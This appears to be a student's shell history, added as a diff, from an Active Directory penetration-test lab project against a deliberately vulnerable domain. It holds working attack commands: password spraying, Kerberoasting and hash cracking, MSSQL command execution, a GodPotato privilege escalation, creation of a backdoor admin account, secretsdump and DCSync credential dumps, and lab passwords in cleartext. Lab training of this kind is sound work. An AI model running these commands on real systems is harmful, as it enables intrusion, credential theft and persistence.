@@ -1,0 +1,118 @@
+    1  sudo apt update
+    2  sudo apt full-upgrade -y
+    3  reboot
+    4  sudo apt update
+    5  sudo apt full-upgrade -y
+    6  reboot
+    7  sudo apt autoremove -y
+    8  reboot
+    9  sudo apt install -y openvpn git curl wget unzip nano vim \\nnmap net-tools dnsutils smbclient rpcclient ldap-utils \\npython3 python3-pip python3-venv pipx \\nhashcat john wordlists responder evil-winrm \\nbloodhound neo4j wireshark tshark
+   10  sudo apt update\nsudo apt install -y openvpn git curl wget unzip nano vim \\nnmap net-tools dnsutils smbclient samba-common-bin ldap-utils \\npython3 python3-pip python3-venv pipx \\nhashcat john wordlists responder evil-winrm \\nbloodhound neo4j wireshark tshark
+   11  neo4j
+   12  bloodhound
+   13  python3 -m pipx ensurepath\nsource ~/.bashrc\npipx install impacket\npipx install netexec\npipx install certipy-ad
+   14  echo $SHELL
+   15  pipx install git+https://github.com/Pennyw0rth/NetExec
+   16  ip a
+   17  nmap -T5 192.168.56.0/24
+   18  ls
+   19  cd Bureau
+   20  ls
+   21  cd E5_5OSATTK_CACCIATORE
+   22  git init
+   23  echo "# E5_5OSATTK - Projet Pentest AD - CACCIATORE Vincent" > README.md\n
+   24  cat > .gitignore <<EOF\n# Ne pas pusher les credentials et hash crackés sur un repo public !\nloot/*.hash\nloot/*-cracked-*.txt\nloot/dcsync-*\nloot/secretsdump-*\n*.ccache\n*.kirbi\n*.ntds\nsliver-data/\n\n# Logs sensibles\nlogs/history-*.log\n\n# Fichiers système\n.DS_Store\n*.swp\n__pycache__/\nEOF
+   25  git add README.md .gitignore\n
+   26  git commit -m "first commit"\n
+   27  git config --global user.email "ton.email@exemple.com"\n
+   28  git config --global user.name "Vincent CACCIATORE"\n
+   29  git commit -m "first commit"\n
+   30  git remote add origin https://github.com/VinceRedd/E5_5OSATTK.git\n
+   31  git push -u origin main\n
+   32  git branch -M main
+   33  git push -u origin main\n
+   34  git config --global init.defaultBranch main
+   35  git config --global credential.helper store
+   36  ping -c 3 8.8.8.8\n
+   37  ip a
+   38  ip route
+   39  sudo nmap -Pn 10.10.10.5
+   40  docker
+   41  sudo apt install docker.io
+   42  sudo apt install docker-compose
+   43  ip a
+   44  ip route
+   45  sudo nmap -sn 10.8.0.0/24
+   46  sudo nmap -Pn -sV -O -p 53,88,135,139,389,445,464,593,636,3268,3269,3389 10.8.0.1-7
+   47  nxc smb 10.8.0.1-7
+   48  netexec smb 192.168.56.0/24 | tee logs/p1-netexec-discovery-CV-13-05-2026.log\n
+   49  mkdir -p logs commands screenshots loot
+   50  ls
+   51  netexec smb 192.168.56.0/24 | tee logs/p1-netexec-discovery-CV-13-05-2026.log\n
+   52  nmap -sn 192.168.56.0/24 -oN logs/p1-discovery-CG-13-05-2026.txt
+   53  netexec smb 192.168.56.0/24 | tee logs/p1-netexec-smb-CG-13-05-2026.log\n
+   54  sudo nmap -sCV -p- --min-rate 1500 -oN logs/p1-nmap-kingslanding-CG-13-05-2026.nmap 192.168.56.10\n
+   55  enum4linux-ng -A 192.168.56.11 -oA logs/p2-enum4linux-winterfell-CG-13-05-2026\n
+   56  netexec smb 192.168.56.11 -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local \\n  | tee logs/p2-validate-samwell-CG-13-05-2026.log
+   57  impacket-GetADUsers -all -dc-ip 192.168.56.11 \\n  north.sevenkingdoms.local/samwell.tarly:Heartsbane \\n  > logs/p2-getadusers-north-CG-13-05-2026.log
+   58  awk 'NR>3 && /\./ {print $1}' logs/p2-getadusers-north-CG-13-05-2026.log \\n  > wordlists/north-users-CG-13-05-2026.txt
+   59  netexec smb 192.168.56.11 -u samwell.tarly -p Heartsbane --pass-pol \\n  > logs/p2-pass-pol-CG-13-05-2026.log
+   60  netexec smb 192.168.56.11 \\n  -u wordlists/north-users-CG-13-05-2026.txt \\n  -p wordlists/north-users-CG-13-05-2026.txt \\n  --no-bruteforce --continue-on-success \\n  > logs/p4-spray-CG-13-05-2026.log
+   61  awk 'NR>3 && /\./ {print $1}' logs/p2-getadusers-north-CG-13-05-2026.log \\n  > wordlists/north-users-CG-13-05-2026.txt
+   62  netexec smb 192.168.56.11 \\n  -u wordlists/north-users-CG-13-05-2026.txt \\n  -p wordlists/north-users-CG-13-05-2026.txt \\n  --no-bruteforce --continue-on-success \\n  > logs/p4-spray-CG-13-05-2026.log
+   63  netexec smb 192.168.56.11 192.168.56.22 \\n  -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local \\n  > logs/p4-validate-samwell-multi-CG-13-05-2026.log
+   64  impacket-GetUserSPNs \\n  -dc-ip 192.168.56.11 \\n  -request \\n  -outputfile loot/kerberoast-CG-13-05-2026.hash \\n  north.sevenkingdoms.local/samwell.tarly:Heartsbane \\n  > logs/p4-kerberoast-CG-13-05-2026.log
+   65  hashcat -m 13100 \\n  loot/kerberoast-CG-13-05-2026.hash \\n  /usr/share/wordlists/rockyou.txt \\n  --force \\n  -o loot/kerberoast-cracked-CG-13-05-2026.txt \\n  | tee logs/p4-hashcat-kerberoast-CG-13-05-2026.log
+   66  sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+   67  hashcat -m 13100 \\n  loot/kerberoast-CG-13-05-2026.hash \\n  /usr/share/wordlists/rockyou.txt \\n  --force \\n  -o loot/kerberoast-cracked-CG-13-05-2026.txt \\n  | tee logs/p4-hashcat-kerberoast-CG-13-05-2026.log
+   68  netexec mssql 192.168.56.22 -u jon.snow -p iknownothing \\n  > logs/p4-mssql-validate-CG-13-05-2026.log
+   69  netexec mssql 192.168.56.22 \\n  -u jon.snow -p iknownothing \\n  -x 'whoami' \\n  | tee logs/p4-xpcmdshell-whoami-CG-13-05-2026.log
+   70  netexec mssql 192.168.56.22 \\n  -u jon.snow -p iknownothing \\n  -x 'whoami /priv' \\n  | tee logs/p4-xpcmdshell-priv-CG-13-05-2026.log
+   71  mkdir -p tools\nwget -q https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe \\n  -O tools/GodPotato-CG-13-05-2026.exe\n\nsha256sum tools/GodPotato-CG-13-05-2026.exe > logs/p4-godpotato-sha256-CG-13-05-2026.log
+   72  smbclient //192.168.56.22/all \\n  -U 'north.sevenkingdoms.local\jon.snow%iknownothing' \\n  -c 'put tools/GodPotato-CG-13-05-2026.exe GodPotato-CG-13-05-2026.exe' \\n  > logs/p4-smb-upload-CG-13-05-2026.log
+   73  netexec mssql 192.168.56.22 \\n  -u jon.snow -p iknownothing \\n  -x 'C:\Shares\all\GodPotato-CG-13-05-2026.exe -cmd "cmd /c whoami"' \\n  | tee logs/p4-godpotato-detonation-CG-13-05-2026.log
+   74  netexec mssql 192.168.56.22 \\n  -u jon.snow -p iknownothing \\n  -x "whoami"
+   75  netexec mssql 192.168.56.22 \\n  -u jon.snow -p iknownothing \\n  -x 'C:\Shares\all\GodPotato-CG-13-05-2026.exe -cmd "cmd /c whoami > C:\Shares\all\gp-whoami.txt"'
+   76  smbclient //192.168.56.22/all \\n  -U 'north.sevenkingdoms.local/jon.snow%iknownothing' \\n  -c 'get gp-whoami.txt loot/gp-whoami.txt'
+   77  netexec mssql 192.168.56.22 \\n  -u jon.snow -p iknownothing \\n  -x 'cmd /c echo TEST > C:\Shares\all\nxc-test.txt'
+   78  smbclient //192.168.56.22/all \\n  -U 'north.sevenkingdoms.local/jon.snow%iknownothing' \\n  -c 'get nxc-test.txt loot/nxc-test.txt'
+   79  netexec mssql 192.168.56.22 \\n  -u jon.snow -p iknownothing \\n  -x 'C:\Shares\all\GodPotato-CG-13-05-2026.exe -cmd "cmd /c whoami > C:\Windows\Temp\gp-whoami.txt"'
+   80  netexec mssql 192.168.56.22 \\n  -u jon.snow -p iknownothing \\n  -x 'cmd /c type C:\Windows\Temp\gp-whoami.txt'
+   81  netexec mssql 192.168.56.22 \\n  -u jon.snow -p iknownothing \\n  -x 'C:\Shares\all\GodPotato-CG-13-05-2026.exe -cmd "cmd /c echo GP_OK > C:\Windows\Temp\gp-test.txt"'
+   82  netexec mssql 192.168.56.22 \\n  -u jon.snow -p iknownothing \\n  -x 'C:\Shares\all\GodPotato-CG-13-05-2026.exe -cmd "cmd /c echo GP_OK > C:\Shares\all\gp.txt 2>&1"'
+   83  smbclient //192.168.56.22/all \\n  -U 'north.sevenkingdoms.local/jon.snow%iknownothing' \\n  -c 'dir; get gp.txt loot/gp.txt'
+   84  smbclient //192.168.56.22/all \\n  -U 'north.sevenkingdoms.local/jon.snow%iknownothing' \\n  -c 'del GodPotato-CG-13-05-2026.exe; dir'
+   85  ls -lh tools/GodPotato-CG-13-05-2026.exe\nfile tools/GodPotato-CG-13-05-2026.exe
+   86  rm -f tools/GodPotato-CG-13-05-2026.exe\n\ncurl -fL \\n  -o tools/GodPotato-CG-13-05-2026.exe \\n  https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe\n\nls -lh tools/GodPotato-CG-13-05-2026.exe\nfile tools/GodPotato-CG-13-05-2026.exe
+   87  smbclient //192.168.56.22/all \\n  -U 'north.sevenkingdoms.local/jon.snow%iknownothing' \\n  -c 'put tools/GodPotato-CG-13-05-2026.exe GodPotato-CG-13-05-2026.exe; dir'
+   88  netexec mssql 192.168.56.22 \\n  -u jon.snow -p iknownothing \\n  -x 'C:\Shares\all\GodPotato-CG-13-05-2026.exe -cmd "cmd /c whoami"' \\n  | tee logs/p4-godpotato-detonation-CG-13-05-2026.log
+   89  netexec mssql 192.168.56.22 \\n  -u jon.snow -p iknownothing \\n  -x 'cmd /c start /b C:\Shares\all\GodPotato-CG-13-05-2026.exe -cmd "cmd /c whoami > C:\Shares\all\gp-whoami.txt 2>&1"'
+   90  ls -lh tools/GodPotato-CG-13-05-2026.exe\nfile tools/GodPotato-CG-13-05-2026.exe\ncat tools/GodPotato-CG-13-05-2026.exe
+   91  rm -f tools/GodPotato-CG-13-05-2026.exe\n\ncurl -L -f \\n  -o tools/GodPotato-CG-13-05-2026.exe \\n  https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe\n\nls -lh tools/GodPotato-CG-13-05-2026.exe\nfile tools/GodPotato-CG-13-05-2026.exe
+   92  impacket-secretsdump \\n  -outputfile loot/secretsdump-castelblack-CG-13-05-2026 \\n  north.sevenkingdoms.local/jon.snow:iknownothing@192.168.56.22 \\n  > logs/p4-secretsdump-castelblack-CG-13-05-2026.log
+   93  smbclient //192.168.56.22/all \\n  -U 'north.sevenkingdoms.local\jon.snow%iknownothing' \\n  -c 'put tools/GodPotato-CG-13-05-2026.exe GodPotato-CG-13-05-2026.exe' \\n  > logs/p4-smb-upload-CG-13-05-2026.log
+   94  ls
+   95  wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe \\n  -O tools/GodPotato-CG-13-05-2026.exe
+   96  reboot
+   97  sudo nmap -sCV -p- --min-rate 1500 -oN logs/p1-nmap-castelblack-CG-13-05-2026.nmap  192.168.56.22\n
+   98  sudo nmap -sCV -p- --min-rate 1500 -oN logs/p1-nmap-winterfell-CG-13-05-2026.nmap   192.168.56.11\n
+   99  ls
+  100  cd Bureau/E5_5OSATTK_CACCIATORE
+  101  wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe \\n  -O tools/GodPotato-CG-13-05-2026.exe
+  102  sha256sum tools/GodPotato-CG-13-05-2026.exe > logs/p4-godpotato-sha256-CG-13-05-2026.log\n
+  103  smbclient //192.168.56.22/all \\n  -U 'north.sevenkingdoms.local\jon.snow%iknownothing' \\n  -c 'put tools/GodPotato-CG-13-05-2026.exe GodPotato-CG-13-05-2026.exe' \\n  > logs/p4-smb-upload-CG-13-05-2026.log
+  104  netexec mssql 192.168.56.22 \\n  -u jon.snow -p iknownothing \\n  -x 'C:\Shares\all\GodPotato-CG-13-05-2026.exe -cmd "cmd /c whoami"' \\n  | tee logs/p4-godpotato-detonation-CG-13-05-2026.log
+  105  impacket-secretsdump \\n  -outputfile loot/secretsdump-castelblack-CG-13-05-2026 \\n  north.sevenkingdoms.local/jon.snow:iknownothing@192.168.56.22 \\n  > logs/p4-secretsdump-castelblack-CG-13-05-2026.log
+  106  echo '$DCC2$10240#eddard.stark#<hash>' > loot/dcc2-eddard-CG-13-05-2026.hash\nhashcat -m 2100 loot/dcc2-eddard-CG-13-05-2026.hash \\n  /usr/share/wordlists/rockyou.txt --force \\n  -o loot/dcc2-cracked-CG-13-05-2026.txt
+  107  netexec mssql 192.168.56.22 \\n  -u jon.snow -p iknownothing \\n  -x 'dir C:\Shares\all'
+  108  netexec mssql 192.168.56.22 \\n  -u jon.snow -p iknownothing \\n  -x 'C:\Shares\all\GodPotato-CG-13-05-2026.exe -cmd "cmd /c net user backdoorCG P@ssw0rd2026! /add && net localgroup Administrators backdoorCG /add"'
+  109  impacket-secretsdump 'backdoorCG:P@ssw0rd2026!@192.168.56.22' \\n  > loot/secretsdump-castelblack-CG-13-05-2026.log
+  110  netexec mssql 192.168.56.22 \\n  -u jon.snow -p iknownothing \\n  -x 'C:\Shares\all\GodPotato-CG-13-05-2026.exe -cmd "cmd /c net user backdoorCG P@ssw0rd2026! /add && net localgroup Administrators backdoorCG /add"' \\n  | tee logs/p4-backdoor-create-CG-13-05-2026.log
+  111  impacket-secretsdump 'backdoorCG:P@ssw0rd2026!@192.168.56.22' \\n  > loot/secretsdump-castelblack-CG-13-05-2026.log
+  112  impacket-secretsdump -just-dc \\n  north.sevenkingdoms.local/sql_svc:'YouWillNotKerboroast1ngMeeeeee'@192.168.56.11 \\n  > logs/p4-dcsync-attempt-sqlsvc-CG-13-05-2026.log 2>&1
+  113  reboot
+  114  echo '$DCC2$10240#robb.stark#f19bfb9b10ba923f2e28b733e5dd1405' \\n  > loot/dcc2-robbstark-CG-13-05-2026.hash\n\nhashcat -m 2100 loot/dcc2-robbstark-CG-13-05-2026.hash \\n  /usr/share/wordlists/rockyou.txt --force \\n  -o loot/dcc2-robb-cracked-CG-13-05-2026.txt
+  115  history > logs/history-projet-CACCIATORE-VINCENT.log\n
+  116  cd Bureau/E5_5OSATTK_CACCIATORE
+  117  netexec smb 192.168.56.11 -u robb.stark -p 'sexywolfy' -d north.sevenkingdoms.local \\n  | tee logs/p4-validate-robbstark-CG-13-05-2026.log
+  118  impacket-secretsdump -just-dc \\n  -outputfile loot/dcsync-north-CG-13-05-2026 \\n  'north.sevenkingdoms.local/robb.stark:sexywolfy@192.168.56.11' \\n  | tee logs/p4-dcsync-north-CG-13-05-2026.log
